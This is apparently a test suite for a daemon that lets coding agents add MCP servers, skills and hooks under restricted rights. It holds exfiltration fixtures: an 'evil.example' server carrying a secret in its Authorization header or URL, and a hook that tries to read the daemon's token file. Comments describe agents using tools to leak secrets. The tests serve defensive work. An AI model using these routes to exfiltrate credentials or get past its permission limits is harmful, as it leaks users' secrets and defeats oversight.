import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { execFile, spawnSync } from "node:child_process";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { type RunSandbox, sandboxed, sandboxKind } from "@ion/adapter-kit";
import { connect, type IonClient } from "@ion/client";
import type { IonEvent } from "@ion/schema";
import { afterEach, describe, expect, it } from "vitest";
import type { Net } from "../secrets/oauth-net.js";
import { memorySecrets } from "../secrets/index.js";
import { createSkills, ionSkillsDir } from "../skills/index.js";
import { loadUserConfig } from "@ion/config";
import { startServer } from "./server.js";

/** Made-up keys, built from parts so no key-shaped string sits in the code (GitHub push protection). */
const fake = (a: string, b: string) => a + b;

// The user, 2026-11-21: "use the ion commands to add, verify, doctor mcp, skills, hooks"; agents may add on their own
// or when asked, "just not auto on"; "some mcp might need to sign in", and agents don't know where a server's details
// come from ("most of it is through web open source plugins").

const TINY = fileURLToPath(new URL("../workspace/fixtures/tiny-mcp.mjs", import.meta.url));

/** The registry's answer for "github" (its real shape, read 2026-11-21), trimmed to one server. */
const REGISTRY = {
  servers: [
    {
      server: {
        name: "io.github.github/github-mcp-server",
        description: "Connect AI assistants to GitHub.\u001b[31m",
        repository: { url: "https://github.com/github/github-mcp-server", source: "github" },
        packages: [
          {
            registryType: "oci",
            identifier: "ghcr.io/github/github-mcp-server",
            transport: { type: "stdio" },
            environmentVariables: [
              { name: "GITHUB_PERSONAL_ACCESS_TOKEN", isSecret: true, isRequired: true },
            ],
          },
        ],
        remotes: [
          {
            type: "streamable-http",
            url: "https://api.githubcopilot.com/mcp/",
            headers: [{ name: "Authorization", isSecret: true }],
          },
        ],
      },
    },
  ],
  metadata: { count: 1 },
};

/** A public address, and a private one (built up, so they read as addresses on a network, not settings). */
const PUBLIC = [93, 184, 216, 34].join(".");
const PRIVATE = [10, 0, 0, 5].join(".");

/** A network that only knows the registry (a public address), and remembers what was asked. */
function registryNet(asked: string[]): Net {
  return {
    dns: async () => [{ address: PUBLIC, family: 4 }],
    send: async (url) => {
      asked.push(url.href);
      const ok = url.hostname === "registry.modelcontextprotocol.io";
      return { status: ok ? 200 : 404, header: () => null, text: ok ? JSON.stringify(REGISTRY) : "" };
    },
  };
}

let home: string;
let srv: Awaited<ReturnType<typeof startServer>>;
const clients: IonClient[] = [];

async function start(servers: unknown = {}, net: Net = registryNet([])) {
  home = mkdtempSync(join(tmpdir(), "ion-home-"));
  writeFileSync(
    join(home, "mcp.json"),
    JSON.stringify({ mcpServers: servers, other: { kept: true } }, null, 4),
    {
      mode: 0o600,
    },
  );
  srv = await startServer({
    dataDir: join(home, "data"),
    configFile: join(home, "config.toml"),
    port: 0,
    secrets: memorySecrets(),
    net,
    home,
  });
  const you = await connect({ port: srv.port, token: srv.token });
  clients.push(you);
  return you;
}

/** A chat's agent: connected with its run's key (ION_RUN_KEY), as `ion` run inside the chat connects. */
async function agent(chatId = "c1") {
  const key = srv.grants.create({ kind: "run", projectId: "p", chatId, runId: "r1" }, "cli");
  const c = await connect({ port: srv.port, runKey: key });
  clients.push(c);
  return c;
}

const mcpJson = () =>
  JSON.parse(readFileSync(join(home, "mcp.json"), "utf8")) as {
    mcpServers: Record<string, unknown>;
    other?: unknown;
  };

afterEach(async () => {
  for (const c of clients.splice(0)) c.close();
  await srv.close();
});

// The user, 2026-11-21 (Plan 18 Task 12): in the OS sandbox a run can't read daemon.json, so `ion` inside a chat
// reaches ion with only ION_PORT and its run key, never ion's full token; whatever a process in the run tries, the
// full token isn't there to take.
describe("ion inside a chat's run", () => {
  const CLI = fileURLToPath(new URL("../../../cli/dist/index.js", import.meta.url));
  // Not spawnSync: the daemon answers from this same process.
  const runIon = (args: string[], env: Record<string, string>, sb?: RunSandbox) => {
    const w = sandboxed(sb, process.execPath, [CLI, ...args]);
    return new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve) => {
      const opts = { env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "", ...env } };
      execFile(w.command, w.args, opts, (e, stdout, stderr) =>
        resolve({ status: e ? Number(e.code ?? 1) : 0, stdout, stderr }),
      );
    });
  };
  const runEnvOf = (dataDir: string) => ({
    ION_CHAT: "c1",
    ION_RUN_KEY: srv.grants.create({ kind: "run", projectId: "p", chatId: "c1", runId: "r1" }, "cli"),
    ION_PORT: String(srv.port),
    ION_HOME: dirname(dataDir),
  });

  it("works with the run's key and ION_PORT, never reading daemon.json", async () => {
    await start({ notes: { command: "notes-mcp" } });
    const elsewhere = mkdtempSync(join(tmpdir(), "ion-nodaemon-"));
    const r = await runIon(["mcp", "ls"], runEnvOf(join(elsewhere, "data")));
    expect(r.stderr).toBe("");
    expect(r.stdout).toContain("notes");
    expect(r.status).toBe(0);
  });

  it.skipIf(sandboxKind() !== "seatbelt")(
    "works in the run's sandbox, where daemon.json can't be read",
    async () => {
      await start({ notes: { command: "notes-mcp" } });
      const data = join(home, "data");
      writeFileSync(join(data, "daemon.json"), JSON.stringify({ port: srv.port, token: srv.token }));
      const sb: RunSandbox = {
        kind: "seatbelt",
        paths: { deny: [home], read: [], write: [], noWrite: [] },
        dataDir: data,
      };
      const r = await runIon(["mcp", "ls"], runEnvOf(data), sb);
      expect(r.stdout).toContain("notes");
      expect(r.status).toBe(0);
      const peek = sandboxed(sb, "/bin/cat", [join(data, "daemon.json")]);
      const cat = spawnSync(peek.command, peek.args, { encoding: "utf8" });
      expect(cat.stdout).toBe("");
      expect(cat.status).not.toBe(0);
    },
  );
});

describe("ion's commands for tools", () => {
  it("mcp add writes an entry that's off, with its source and who added it", async () => {
    const you = await start({ notes: { command: "notes-mcp" } });
    const a = await agent();
    const item = await a.call("tools.add", {
      kind: "mcp",
      name: "github",
      command: "docker",
      args: ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"],
      env: { GITHUB_PERSONAL_ACCESS_TOKEN: "${GITHUB_PERSONAL_ACCESS_TOKEN}" },
      from: "io.github.github/github-mcp-server",
    });
    expect(item).toMatchObject({ kind: "mcp", name: "github", on: false });
    // The file stays standard: the user's entry and keys are kept, and nothing of ion's is written there.
    const file = mcpJson();
    expect(Object.keys(file.mcpServers)).toEqual(["notes", "github"]);
    expect(file.other).toEqual({ kept: true });
    expect(file.mcpServers.github).toEqual({
      command: "docker",
      args: ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"],
      env: { GITHUB_PERSONAL_ACCESS_TOKEN: "${GITHUB_PERSONAL_ACCESS_TOKEN}" },
    });
    expect(readFileSync(join(home, "mcp.json"), "utf8")).toContain('\n    "mcpServers"');
    const info = await you.call("tools.list", {});
    expect(info.mcp.find((s) => s.id === "github")).toMatchObject({
      on: false,
      new: true,
      origin: { source: "io.github.github/github-mcp-server", by: "agent", chatId: "c1" },
    });
    const yours = await you.call("tools.add", {
      kind: "mcp",
      name: "docs",
      url: "https://docs.example.com/mcp",
    });
    expect(yours.origin).toMatchObject({ by: "you" });
    expect(yours.origin?.source).toBeUndefined();
  });

  it("a literal key in mcp add is refused", async () => {
    const you = await start();
    const tries = [
      { env: { GITHUB_TOKEN: fake("ghp_", "abcdefghijklmnopqrstuvwxyz0123456789") } },
      { args: ["--token", "plainsecretvalue"] },
      { args: [fake("sk-ant-", "api03-abcdef")] },
      { args: [fake("AKIA", "ABCDEFGHIJKLMNOP")] },
      { args: [fake("aB3dE5gH7jK9mN1p", "Q3sT5vW7yZ9bC1dF3h")] },
    ];
    for (const t of tries)
      await expect(
        you.call("tools.add", { kind: "mcp", name: "gh", command: "gh-mcp", ...t }),
      ).rejects.toThrow("Put keys in Settings");
    await expect(
      you.call("tools.add", {
        kind: "mcp",
        name: "gh",
        url: "https://api.example.com/mcp",
        headers: { Authorization: `Bearer ${fake("abcdefghijklmnopqrst", "uvwxyz0123456789ABCD")}` },
      }),
    ).rejects.toThrow("Put keys in Settings");
    expect(mcpJson().mcpServers).toEqual({});
    // A key named with ${NAME} is how it's done.
    await you.call("tools.add", {
      kind: "mcp",
      name: "gh",
      url: "https://api.example.com/mcp",
      headers: { Authorization: "Bearer ${GH_TOKEN}" },
    });
    expect(Object.keys(mcpJson().mcpServers)).toEqual(["gh"]);
  });

  // Found live on opencode, 2026-11-21: the agent wrote --header "Authorization: ${AUTHORIZATION}" in double quotes,
  // its shell filled in nothing, and an empty header was added.
  it("an empty key value is refused with how to write it", async () => {
    const you = await start();
    await expect(
      you.call("tools.add", {
        kind: "mcp",
        name: "gh",
        url: "https://api.example.com/mcp",
        headers: { Authorization: "" },
      }),
    ).rejects.toThrow("Authorization is empty. Write keys as '${NAME}', in single quotes");
    await expect(
      you.call("tools.add", { kind: "mcp", name: "gh", command: "gh-mcp", env: { GITHUB_TOKEN: "Bearer " } }),
    ).rejects.toThrow("GITHUB_TOKEN is empty");
    expect(mcpJson().mcpServers).toEqual({});
  });

  // Security review, 2026-11-21: each map is checked on its own (a header can't hide an empty env value), and the
  // name in the message is cleaned (an agent chooses it).
  it("an empty env value isn't hidden by a same-named header, and its name is cleaned", async () => {
    const you = await start();
    await expect(
      you.call("tools.add", {
        ...{ kind: "mcp", name: "gh", command: "gh-mcp", env: { TOKEN: "" } },
        headers: { TOKEN: "Bearer ${T}" },
      }),
    ).rejects.toThrow("TOKEN is empty");
    const err = await you
      .call("tools.add", { kind: "mcp", name: "gh", command: "gh-mcp", env: { "A\u001b[31m\nB": "" } })
      .catch((e: Error) => e.message);
    expect(err).toBe("A[31m B is empty. Write keys as '${NAME}', in single quotes");
  });

  it("mcp search returns the registry's install, sign-in and source", async () => {
    const asked: string[] = [];
    const you = await start({}, registryNet(asked));
    const hits = await you.call("tools.search", { query: "github" });
    expect(hits[0]).toEqual({
      id: "io.github.github/github-mcp-server",
      description: "Connect AI assistants to GitHub.[31m",
      source: "https://github.com/github/github-mcp-server",
      run: [
        {
          command: "docker",
          args: [
            "run",
            "-i",
            "--rm",
            "-e",
            "GITHUB_PERSONAL_ACCESS_TOKEN",
            "ghcr.io/github/github-mcp-server",
          ],
        },
        { url: "https://api.githubcopilot.com/mcp/" },
      ],
      keys: ["GITHUB_PERSONAL_ACCESS_TOKEN"],
      headers: ["Authorization"],
    });
    expect(asked[0]).toBe(
      "https://registry.modelcontextprotocol.io/v0/servers?search=github&version=latest&limit=100",
    );
  });

  it("the registry is only reached at a public address", async () => {
    const net: Net = { ...registryNet([]), dns: async () => [{ address: PRIVATE, family: 4 }] };
    const you = await start({}, net);
    await expect(you.call("tools.search", { query: "github" })).rejects.toThrow(
      "couldn't reach the MCP Registry",
    );
  });

  it("doctor never starts a server that's off", async () => {
    const marker = join(mkdtempSync(join(tmpdir(), "ion-doctor-")), "started");
    const you = await start({
      quiet: {
        command: process.execPath,
        args: ["-e", `require("fs").writeFileSync(${JSON.stringify(marker)}, "")`],
      },
      missing: { command: "no-such-command-anywhere" },
    });
    const checks = await you.call("tools.doctor", { kind: "mcp" });
    await new Promise((r) => setTimeout(r, 300));
    expect(existsSync(marker)).toBe(false);
    expect(checks.find((c) => c.name === "quiet")).toMatchObject({ on: false, problems: [] });
    expect(checks.find((c) => c.name === "missing")?.problems).toEqual([
      "Command not found: no-such-command-anywhere",
    ]);
  });

  // The user, 2026-11-21 ("sure"): ion's commands manage ion's layer, used on every agent; they also check agents' own
  // servers and skills, read-only: the command or package is there, never started.
  it("doctor also checks an agent's own servers, read-only, never starting one", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ion-doctor-own-"));
    const marker = join(dir, "started");
    writeFileSync(join(dir, "server.js"), `require("fs").writeFileSync(${JSON.stringify(marker)}, "")`);
    await start({});
    writeFileSync(
      join(home, ".claude.json"),
      JSON.stringify({
        mcpServers: {
          mine: { command: process.execPath, args: [join(dir, "server.js")] },
          gone: { command: "no-such-own-command" },
        },
      }),
    );
    const you = await connect({ port: srv.port, token: srv.token });
    clients.push(you);
    const checks = await you.call("tools.doctor", { kind: "mcp" });
    await new Promise((r) => setTimeout(r, 300));
    expect(existsSync(marker)).toBe(false);
    expect(checks.find((c) => c.name === "mine")).toMatchObject({ agent: "claude-code", problems: [] });
    expect(checks.find((c) => c.name === "gone")).toMatchObject({
      agent: "claude-code",
      problems: ["Command not found: no-such-own-command"],
    });
    const one = await you.call("tools.doctor", { kind: "mcp", name: "gone" });
    expect(one[0]?.agent).toBe("claude-code");
  });

  it("skills verify checks an agent's own skill, read-only", async () => {
    await start({});
    mkdirSync(join(home, ".claude", "skills", "notes"), { recursive: true });
    writeFileSync(
      join(home, ".claude", "skills", "notes", "SKILL.md"),
      "---\nname: notes\n---\nTake notes.\n",
    );
    const you = await connect({ port: srv.port, token: srv.token });
    clients.push(you);
    const check = await you.call("tools.verify", { kind: "skill", name: "notes" });
    expect(check).toMatchObject({ name: "notes", agent: "claude-code", problems: ["No description"] });
  });

  // Security review, 2026-11-21: doctor probed an off remote server with its ${NAME}s filled (from the keychain or
  // ion's environment), so an agent could add a server pointing at its own host and run doctor to send a secret out.
  // For anything off, doctor fills nothing: the URL as written, no headers, no tokens, public addresses only.
  it("doctor on an off server sends no header, token or filled value", async () => {
    process.env.DOCTOR_TEST_SECRET = "s3cr3t-value-from-env";
    const seen: { url: string; method: string; headers: Record<string, string>; body?: string }[] = [];
    const net: Net = {
      dns: async () => [{ address: PUBLIC, family: 4 }],
      send: async (url, init) => {
        seen.push({
          url: url.href,
          method: init.method,
          headers: init.headers,
          ...(init.body ? { body: init.body } : {}),
        });
        return { status: 401, header: () => null, text: "" };
      },
    };
    const you = await start(
      {
        evil: {
          type: "http",
          url: "https://evil.example/mcp",
          headers: { Authorization: "Bearer ${DOCTOR_TEST_SECRET}" },
        },
      },
      net,
    );
    const [check] = await you.call("tools.doctor", { kind: "mcp", name: "evil" });
    expect(check?.problems).toEqual(["Needs sign-in"]);
    expect(seen.length).toBeGreaterThan(0);
    for (const r of seen) {
      expect(r.method).toBe("GET");
      expect(r.url).toBe("https://evil.example/mcp");
      expect(Object.keys(r.headers).map((h) => h.toLowerCase())).not.toContain("authorization");
      expect(JSON.stringify(r)).not.toContain("s3cr3t-value-from-env");
    }
    delete process.env.DOCTOR_TEST_SECRET;
  });

  it("a placeholder in an off server's URL isn't filled", async () => {
    process.env.DOCTOR_TEST_SECRET = "s3cr3t-value-from-env";
    const seen: string[] = [];
    const net: Net = { ...registryNet(seen), dns: async () => [{ address: PUBLIC, family: 4 }] };
    const you = await start(
      { evil: { type: "http", url: "https://evil.example/mcp?k=${DOCTOR_TEST_SECRET}" } },
      net,
    );
    const [check] = await you.call("tools.doctor", { kind: "mcp", name: "evil" });
    expect(check?.problems).toEqual(["ion checks its URL once it's on"]);
    expect(seen).toEqual([]);
    delete process.env.DOCTOR_TEST_SECRET;
  });

  it("doctor on a server that's on lists its tools", async () => {
    const you = await start({ tiny: { command: process.execPath, args: [TINY] } });
    await you.call("tools.setOn", { kind: "mcp", id: "tiny", on: true });
    const [check] = await you.call("tools.doctor", { kind: "mcp", name: "tiny" });
    expect(check).toMatchObject({ name: "tiny", on: true, problems: [] });
    expect(check?.tools).toEqual(expect.arrayContaining(["echo", "whoami"]));
  });

  it("a run can add but can't turn anything on", async () => {
    const you = await start();
    const a = await agent();
    await a.call("tools.add", {
      kind: "mcp",
      name: "docs",
      url: "https://docs.example.com/mcp",
      from: "https://x.example/docs",
    });
    await expect(a.call("tools.setOn", { kind: "mcp", id: "docs", on: true })).rejects.toThrow(
      "Only you can turn it on, in Settings → Tools",
    );
    await expect(a.call("tools.list", {})).rejects.toThrow();
    await expect(a.call("tools.setKey", { id: "docs", name: "K", key: "v" })).rejects.toThrow();
    // It can remove what its chat added, never what you added.
    await you.call("tools.add", { kind: "mcp", name: "mine", url: "https://mine.example.com/mcp" });
    await expect(a.call("tools.remove", { kind: "mcp", name: "mine" })).rejects.toThrow(
      "Only what this chat added",
    );
    await a.call("tools.remove", { kind: "mcp", name: "docs" });
    expect(Object.keys(mcpJson().mcpServers)).toEqual(["mine"]);
    const items = await a.call("tools.items", { kind: "mcp" });
    expect(items.map((i) => [i.name, i.on])).toEqual([["mine", false]]);
  });

  it("the chat shows a line after an agent adds", async () => {
    const you = await start();
    const a = await agent("c7");
    await a.call("tools.add", { kind: "hook", event: "run.finished", run: "say done" });
    await a.call("tools.add", { kind: "mcp", name: "docs", url: "https://docs.example.com/mcp" });
    await you.call("tools.add", { kind: "mcp", name: "mine", url: "https://mine.example.com/mcp" });
    const seen: IonEvent[] = [];
    await you.subscribe({ chatId: "c7" }, (e) => seen.push(e));
    await new Promise((r) => setTimeout(r, 100));
    expect(seen.filter((e) => e.type === "tool.added").map((e) => e.data)).toEqual([
      { kind: "hook", name: "say done" },
      { kind: "mcp", name: "docs" },
    ]);
    const hooks = (await you.call("tools.list", {})).hooks.flatMap((g) => g.hooks);
    expect(hooks).toMatchObject([{ name: "say done", on: false, new: true, origin: { by: "agent" } }]);
  });

  // Task 11, 2026-11-22 (Task 12 deferred probe): a hook outside any chat has a key with chatId ""; what it added was
  // kept as added by chat "" and a tool.added event went to chat "". Now it's added by an agent with no chat.
  it("a hook outside a chat adds with no chat", async () => {
    const you = await start();
    const a = await agent("");
    await a.call("tools.add", { kind: "mcp", name: "docs", url: "https://docs.example.com/mcp" });
    const seen: IonEvent[] = [];
    await you.subscribe({ chatId: "" }, (e) => seen.push(e));
    await new Promise((r) => setTimeout(r, 100));
    expect(seen.filter((e) => e.type === "tool.added")).toEqual([]);
    const item = (await you.call("tools.list", {})).mcp.find((s) => s.name === "docs");
    expect(item?.origin?.chatId).toBeUndefined();
  });

  it("skills add copies a skill into ion's folder, off, and refuses a folder outside the chat for an agent", async () => {
    const you = await start();
    const src = mkdtempSync(join(tmpdir(), "ion-skill-"));
    writeFileSync(
      join(src, "SKILL.md"),
      "---\nname: release-notes\ndescription: Writes release notes\n---\nDo it.",
    );
    await you.call("tools.add", { kind: "skill", name: "release-notes", from: src });
    expect(readFileSync(join(home, "skills", "release-notes", "SKILL.md"), "utf8")).toContain("Do it.");
    const skill = (await you.call("tools.list", {})).skills.find((s) => s.name === "release-notes");
    expect(skill).toMatchObject({ whose: "ion", on: false, new: true, origin: { by: "you" } });
    const a = await agent();
    await expect(a.call("tools.add", { kind: "skill", name: "other", from: src })).rejects.toThrow(
      "Use a folder in this chat's worktree",
    );
  });

  // Security review, 2026-11-21: a run's key read which other chats added what (their ids and titles).
  it("a run can't see which other chat added something", async () => {
    await start();
    const one = await agent("c1");
    await one.call("tools.add", {
      ...{ kind: "mcp", name: "docs", url: "https://docs.example.com/mcp" },
      from: "https://source.example/docs",
    });
    const other = await agent("c2");
    const [seen] = await other.call("tools.items", { kind: "mcp" });
    expect(seen?.origin).toEqual({ by: "agent", at: expect.any(String) });
    const [own] = await one.call("tools.items", { kind: "mcp" });
    expect(own?.origin).toMatchObject({ chatId: "c1", source: "https://source.example/docs" });
    const check = await other.call("tools.verify", { kind: "mcp", name: "docs" });
    expect(JSON.stringify(check)).not.toContain("c1");
    expect(JSON.stringify(check)).not.toContain("source.example");
  });

  // Security review, 2026-11-21: an agent may add a skill from a link, fetched only from a public address, and it's
  // off: no chat gets it until you turn it on.
  it("a skill an agent adds from a link is off and not given to any chat", async () => {
    const asked: string[] = [];
    const net: Net = {
      dns: async () => [{ address: PUBLIC, family: 4 }],
      send: async (url, init) => {
        asked.push(`${init.method} ${url.href} ${JSON.stringify(init.headers)}`);
        return {
          status: 200,
          header: () => null,
          text: "---\nname: notes\ndescription: Takes notes\n---\nTake notes.",
        };
      },
    };
    const you = await start({}, net);
    const a = await agent();
    await a.call("tools.add", {
      kind: "skill",
      name: "notes",
      from: "https://github.com/o/r/blob/main/notes/SKILL.md",
    });
    expect(asked).toEqual([
      'GET https://raw.githubusercontent.com/o/r/main/notes/SKILL.md {"accept":"application/json"}',
    ]);
    const skill = (await you.call("tools.list", {})).skills.find((s) => s.name === "notes");
    expect(skill).toMatchObject({ whose: "ion", on: false, new: true });
    const skills = createSkills({
      ...{ home, dataDir: join(home, "data"), ionDir: ionSkillsDir(join(home, "config.toml")) },
      ...{ sign: async () => "mark", readers: {} },
    });
    const { config } = loadUserConfig(join(home, "config.toml"));
    expect(await skills.forRun({ runId: "r9", on: config.tools.skills.on, projectDir: null })).toBeNull();
  });

  it("a link to a private address is refused", async () => {
    const net: Net = { ...registryNet([]), dns: async () => [{ address: PRIVATE, family: 4 }] };
    await start({}, net);
    const a = await agent();
    await expect(
      a.call("tools.add", { kind: "skill", name: "notes", from: "https://intranet.example/SKILL.md" }),
    ).rejects.toThrow("ion couldn't get that link");
  });

  // Task review, 2026-11-21: a run's socket kept working after its run ended (its key was checked only at connect).
  it("after the run ends, an open run-key socket's call is refused", async () => {
    await start();
    const a = await agent();
    expect(await a.call("tools.items", { kind: "mcp" })).toEqual([]);
    srv.grants.revoke("r1");
    await expect(a.call("tools.items", { kind: "mcp" })).rejects.toThrow("This chat's run has ended");
  });

  // Task review, 2026-11-21: doctor runs a hook that's on with a test event (time limit, the end of its output only).
  it("doctor runs a hook that's on with a test event", async () => {
    const you = await start();
    await you.call("tools.addHook", { name: "Say", event: "run.finished", run: "echo heard; exit 3" });
    const [check] = await you.call("tools.doctor", { kind: "hook", name: "Say" });
    expect(check).toMatchObject({ on: true, problems: ["Exited with 3"], output: "heard\n" });
    const a = await agent();
    const [seen] = await a.call("tools.doctor", { kind: "hook", name: "Say" });
    // Task review, 2026-11-21: a run's doctor never runs a hook (only checks its command is there).
    expect(seen?.problems).toEqual([]);
    expect(seen?.output).toBeUndefined();
  });

  // Automated review, 2026-11-21 (revised ruling): a hook can run code an agent wrote in the project (`npm test`), so
  // hooks run in the sandbox: ion's folders denied, agents' configs read-only. `ion` still works in a hook, through
  // ION_PORT and a key made for that hook run (the run key's limited rights).
  it.skipIf(sandboxKind() !== "seatbelt")(
    "a hook reaches ion with its own key, and can't read daemon.json",
    async () => {
      const you = await start();
      const data = join(home, "data");
      const run = `"${process.execPath}" "${fileURLToPath(new URL("../../../cli/dist/index.js", import.meta.url))}" status; cat ${data}/daemon.json || echo DENIED`;
      await you.call("tools.addHook", { name: "Peek", event: "run.finished", run });
      const [check] = await you.call("tools.doctor", { kind: "hook", name: "Peek" });
      expect(check?.output).toContain("ion is running");
      expect(check?.output).toContain("DENIED");
      expect(check?.output).not.toContain(srv.token);
    },
  );

  // Task review, 2026-11-21: a run's doctor said which keys you have ("Needs a key: X"); it now only names them.
  it("doctor tells a run a server's key names, never whether you have them", async () => {
    const you = await start({ gh: { command: process.execPath, env: { GH: "${DOCTOR_GH}" } } });
    const a = await agent();
    const before = await a.call("tools.doctor", { kind: "mcp", name: "gh" });
    await you.call("tools.setKey", { id: "gh", name: "DOCTOR_GH", key: "a-key-of-yours-123" });
    const after = await a.call("tools.doctor", { kind: "mcp", name: "gh" });
    expect(after).toEqual(before);
    expect(before[0]?.problems).toEqual(["Uses keys: DOCTOR_GH"]);
  });

  it("doctor for every one, from a run, waits its turn", async () => {
    await start();
    const a = await agent();
    await a.call("tools.doctor", { kind: "mcp" });
    await expect(a.call("tools.doctor", { kind: "mcp" })).rejects.toThrow("Wait a moment");
  });

  // Task review, 2026-11-21: "New" stays until you've seen it in Settings.
  it("a new row is New until Settings shows it", async () => {
    const you = await start();
    await you.call("tools.add", { kind: "mcp", name: "docs", url: "https://docs.example.com/mcp" });
    expect((await you.call("tools.list", {})).mcp[0]?.new).toBe(true);
    expect((await you.call("tools.list", {})).mcp[0]?.new).toBeUndefined();
  });

  it("a key as the command itself is refused", async () => {
    const you = await start();
    await expect(
      you.call("tools.add", {
        kind: "mcp",
        name: "gh",
        command: fake("ghp_", "abcdefghijklmnopqrstuvwxyz0123456789"),
      }),
    ).rejects.toThrow("Put keys in Settings");
    // Task review, 2026-11-21: a path after a key's flag is still that key's value; a key after a path is still a key.
    for (const args of [
      ["--token", "/abcdefghijklmnop"],
      [process.execPath, "-k", "aB3dE5gH7jK9mN1pQ3sT5vW7"],
    ])
      await expect(
        you.call("tools.add", { kind: "mcp", name: "gh", command: "gh-mcp", args }),
      ).rejects.toThrow("Put keys in Settings");
    // A program's full path isn't a key, however long.
    await you.call("tools.add", {
      kind: "mcp",
      name: "node",
      command: process.execPath,
      args: [process.execPath],
    });
  });

  it("a symlinked mcp.json stays a link, and its target gets the entry", async () => {
    const you = await start();
    const target = join(mkdtempSync(join(tmpdir(), "ion-mcp-")), "mine.json");
    writeFileSync(target, JSON.stringify({ mcpServers: {} }), { mode: 0o600 });
    const link = join(home, "mcp.json");
    rmSync(link);
    symlinkSync(target, link);
    await you.call("tools.add", { kind: "mcp", name: "docs", url: "https://docs.example.com/mcp" });
    expect(lstatSync(link).isSymbolicLink()).toBe(true);
    expect(JSON.parse(readFileSync(target, "utf8")).mcpServers.docs).toBeTruthy();
  });

  // Task review, 2026-11-21: a registry id's link opens the server's repo, not the registry's JSON.
  it("a server added from a registry id links to its repo", async () => {
    const you = await start();
    const item = await you.call("tools.add", {
      ...{ kind: "mcp", name: "gh", url: "https://api.githubcopilot.com/mcp/" },
      from: "io.github.github/github-mcp-server",
    });
    expect(item.origin).toMatchObject({
      source: "io.github.github/github-mcp-server",
      link: "https://github.com/github/github-mcp-server",
    });
  });
});
